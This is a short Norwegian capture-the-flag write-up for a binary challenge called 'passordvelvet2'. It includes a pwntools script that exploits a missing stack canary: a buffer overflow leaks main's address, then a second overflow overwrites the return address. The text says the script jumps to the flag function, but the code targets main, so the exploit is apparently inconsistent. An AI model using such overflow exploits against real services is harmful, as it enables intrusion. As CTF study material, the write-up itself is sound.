# Taskname
> Author: Mx. Task

## Challenge

## Solution

Hiver inn i Ghidra, og ser at `main` er lik som forrige oppgave. Men ser vi nærmere på `print_flag` funksjonen, så får vi ikke noe flag der, men vi får en peker til `main`.
Checksec er permissions de samme som forrige, for oss er mangel på `Stack Canary` det som gjelder. Så rebase binary og hopp til flag funksjonen.

```python
#!/usr/bin/env python3
from pwn import *
io = connect('localhost', 4000)
payload = b'sikkerhets\0'
payload += b'A'*(48-len(payload))
payload += p64(0x646167656e)
io.sendlineafter(b'passordet: ', payload)

io.recvuntil(b'ta dette: ')
main_addr = int(io.recvline(keepends=False), 16)

elf = ELF('./passordvelvet2', checksec=False)
elf.address = main_addr - elf.symbols['main']
io.sendlineafter(b'passordet: ', b'A'*72 + p64(elf.symbols['main']))
print(io.recvall(timeout=1))
```

